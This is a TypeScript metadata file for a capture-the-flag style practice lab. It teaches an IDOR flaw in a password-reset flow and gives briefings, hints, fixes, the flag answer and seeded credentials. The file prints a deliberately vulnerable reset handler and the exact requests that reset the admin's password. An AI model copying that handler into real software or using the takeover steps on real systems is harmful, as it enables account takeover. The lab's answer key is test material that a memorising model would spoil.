// src/modules/practice-labs/idor/labs/lab3/lab3.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const idorLab3Metadata: LabMetadata = {
  slug: 'idor-password-reset-flow',
  title: 'IDOR: Password Reset — Account Takeover via userId Manipulation',
  ar_title:
    'IDOR: إعادة تعيين كلمة المرور — الاستيلاء على الحساب عبر التلاعب بـ userId',
  description:
    "Exploit an IDOR vulnerability in the password reset flow where the reset endpoint accepts a userId parameter directly, allowing you to reset any account's password — including the admin account.",
  ar_description:
    'استغل ثغرة IDOR في تدفق إعادة تعيين كلمة المرور حيث يقبل endpoint إعادة التعيين معامل userId مباشرة، مما يتيح لك إعادة تعيين كلمة مرور أي حساب بما فيه حساب المسؤول والاستيلاء عليه بالكامل.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'IDOR',
    'Account Takeover',
    'Password Reset Abuse',
    'Authentication Bypass',
  ],
  xpReward: 250,
  pointsReward: 125,
  duration: 45,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: "Trigger a password reset for your own account, intercept the reset token, then manipulate the userId parameter in the /reset-password endpoint to reset the admin account's password instead.",
  ar_goal:
    'افعّل إعادة تعيين كلمة مرور لحسابك الخاص، التقط رمز إعادة التعيين، ثم تلاعب بمعامل userId في /reset-password لإعادة تعيين كلمة مرور حساب الأدمن بدلاً من ذلك.',

  briefing: {
    en: `CloudBase SaaS — multi-tenant cloud platform. Thousands of companies. Thousands of users.
You are user_john. Standard account. No admin access.
You click "Forgot Password."
A reset email. A token. Standard practice.
You receive the token.
The reset form has two fields: new password. Confirm password.
But you inspect the POST request.
Three fields: token, newPassword — and targetUserId.
The token is yours. Valid for user_john.
You change targetUserId to admin_cloudbase.
The server validates the token.
Token is valid? ✓
Now it resets the password for — whoever targetUserId says.
Not who the token was issued for.
Whoever you told it.`,
    ar: `CloudBase SaaS — منصة سحابية متعددة المستأجرين. آلاف الشركات. آلاف المستخدمين.
أنت user_john. حساب قياسي. لا صلاحيات أدمن.
تنقر على "نسيت كلمة المرور."
بريد إعادة تعيين. رمز. ممارسة قياسية.
تتلقى الرمز.
نموذج إعادة التعيين له حقلان: كلمة المرور الجديدة. التأكيد.
لكنك تفحص طلب POST.
ثلاثة حقول: token، newPassword — وtargetUserId.
الرمز ملكك. صالح لـ user_john.
تغير targetUserId إلى admin_cloudbase.
الخادم يتحقق من الرمز.
الرمز صالح؟ ✓
الآن يعيد تعيين كلمة المرور لـ — أياً كان ما يقوله targetUserId.
ليس من صدر الرمز له.
أياً كان من قلت له.`,
  },

  stepsOverview: {
    en: [
      'Request a password reset for user_john — receive a valid reset token',
      'Inspect the /reset-password endpoint request — note the targetUserId field',
      'Understand the vulnerability: token is validated but bound to the wrong user',
      'Resend the reset request with your valid token but targetUserId: "admin_cloudbase"',
      'Login as admin_cloudbase with your new password — retrieve the flag',
    ],
    ar: [
      'اطلب إعادة تعيين كلمة مرور لـ user_john — احصل على رمز إعادة تعيين صالح',
      'افحص طلب endpoint /reset-password — لاحظ حقل targetUserId',
      'افهم الثغرة: الرمز مُتحقَّق منه لكن مرتبط بالمستخدم الخطأ',
      'أعد إرسال طلب إعادة التعيين بالرمز الصالح الخاص بك لكن مع targetUserId: "admin_cloudbase"',
      'سجّل الدخول كـ admin_cloudbase بكلمة مرورك الجديدة — استرجع العلم',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      "CloudBase /reset-password endpoint validates the reset token format and expiry, but uses the targetUserId from the REQUEST BODY (not from the stored token record) to determine which account to reset. An attacker with any valid reset token can reset any other account's password by substituting the targetUserId.",
    vulnerableCode:
      '// Password reset (vulnerable):\n' +
      "app.post('/reset-password', async (req, res) => {\n" +
      '  const { token, targetUserId, newPassword } = req.body;\n' +
      '  const resetRecord = await db.resetTokens.findOne({ token });\n' +
      '  if (!resetRecord || resetRecord.expired) {\n' +
      "    return res.status(400).json({ error: 'Invalid token' });\n" +
      '  }\n' +
      '  // ❌ Uses userId from REQUEST BODY, not from the token record!\n' +
      '  await db.users.update({ id: targetUserId, password: hash(newPassword) });\n' +
      '  res.json({ success: true });\n' +
      '});',
    exploitation:
      '1. POST /auth/forgot-password { "username": "user_john" } → get reset token from /auth/get-token\n' +
      '2. POST /auth/reset-password { "token": "<token>", "targetUserId": "admin_cloudbase", "newPassword": "hacked123" }\n' +
      '3. POST /auth/login { "username": "admin_cloudbase", "password": "hacked123" } → admin JWT → flag in profile',
    steps: {
      en: [
        'POST /auth/forgot-password { "username": "user_john" } → reset initiated',
        'GET /auth/get-token → lab simulation returns your reset token',
        'POST /auth/reset-password { "token": "<your_token>", "targetUserId": "admin_cloudbase", "newPassword": "hacked123" } → 200 OK',
        'POST /auth/login { "username": "admin_cloudbase", "password": "hacked123" } → admin JWT token returned',
        'GET /auth/profile with admin JWT → flag: FLAG{IDOR_PASSWORD_RESET_ACCOUNT_TAKEOVER_ADMIN}',
      ],
      ar: [
        'POST /auth/forgot-password { "username": "user_john" } → بدأت إعادة التعيين',
        'GET /auth/get-token → محاكاة المختبر تُعيد رمز إعادة التعيين الخاص بك',
        'POST /auth/reset-password { "token": "<your_token>"، "targetUserId": "admin_cloudbase"، "newPassword": "hacked123" } → 200 OK',
        'POST /auth/login { "username": "admin_cloudbase"، "password": "hacked123" } → رمز JWT للأدمن مُعاد',
        'GET /auth/profile مع JWT الأدمن → العلم: FLAG{IDOR_PASSWORD_RESET_ACCOUNT_TAKEOVER_ADMIN}',
      ],
    },
    fix: [
      'Never accept userId from the request body in password reset — use only the userId embedded in the token record stored in the database',
      'Correct pattern: const { userId } = await db.resetTokens.findOne({ token }) — trust the token, not the request',
      'One-time tokens: invalidate the token immediately after use',
      'Rate limit: maximum 3 reset attempts per email per hour — prevents token brute force',
    ],
  },

  postSolve: {
    explanation: {
      en: 'This is a variant of IDOR in sensitive account workflows. The token proves identity ("I own a valid reset token") but the user ID determines the target ("whose password gets reset"). Separating these two concerns and trusting the client-supplied userId is a critical design error. The fix is conceptually simple: bind the user ID to the token at issuance and ignore any user-supplied userId.',
      ar: 'هذا نوع من IDOR في تدفقات الحسابات الحساسة. الرمز يثبت الهوية ("أمتلك رمز إعادة تعيين صالح") لكن معرف المستخدم يحدد الهدف ("كلمة مرور من تُعاد"). فصل هاتين المسألتين والوثوق بـ userId المُقدَّم من العميل هو خطأ تصميمي حرج. الحل بسيط مفاهيمياً: اربط معرف المستخدم بالرمز عند إصداره وتجاهل أي userId مُقدَّم من المستخدم.',
    },
    impact: {
      en: 'Complete account takeover for any user on the platform — including admin, super-admin, and any specific high-value target. No brute force, no phishing, no social engineering. One valid reset token (for any account) is enough to compromise any other account on the platform.',
      ar: 'استيلاء كامل على الحساب لأي مستخدم على المنصة — بما في ذلك الأدمن والسوبر أدمن وأي هدف عالي القيمة. لا قوة غاشمة، لا تصيد، لا هندسة اجتماعية. رمز إعادة تعيين صالح واحد (لأي حساب) يكفي لاختراق أي حساب آخر على المنصة.',
    },
    fix: [
      'Token-bound userId: store { token, userId, expiry } — the userId is only read FROM the database record, never from the request',
      'Invalidate immediately: delete the token record after successful password reset',
      'Notify original owner: send "your password was reset" email to the token\'s legitimate owner as a security alert',
      'Audit: log every password reset attempt with token, requested userId, and source IP',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 15,
      content:
        'Request a password reset for user_john. You receive a reset token. Inspect the reset request body — there is a "targetUserId" field alongside the token.',
    },
    {
      order: 2,
      xpCost: 30,
      content:
        'Your token is valid for user_john. What if you keep the same valid token but change targetUserId to "admin_cloudbase"? Does the server check whose token it really is?',
    },
    {
      order: 3,
      xpCost: 55,
      content:
        'POST /auth/reset-password with { "token": "<your_token>", "targetUserId": "admin_cloudbase", "newPassword": "hacked123" } — then login with those credentials to get the flag.',
    },
  ],

  flagAnswer: 'FLAG{IDOR_PASSWORD_RESET_ACCOUNT_TAKEOVER_ADMIN}',
  initialState: {
    users: [
      {
        username: 'user_john',
        password: 'john123',
        role: 'user',
        email: 'john@cloudbase.io',
      },
      {
        username: 'admin_cloudbase',
        password: 'ADM1N_CL0UD_S3CR3T!',
        role: 'admin',
        email: 'admin@cloudbase.io',
      },
    ],
  },
};
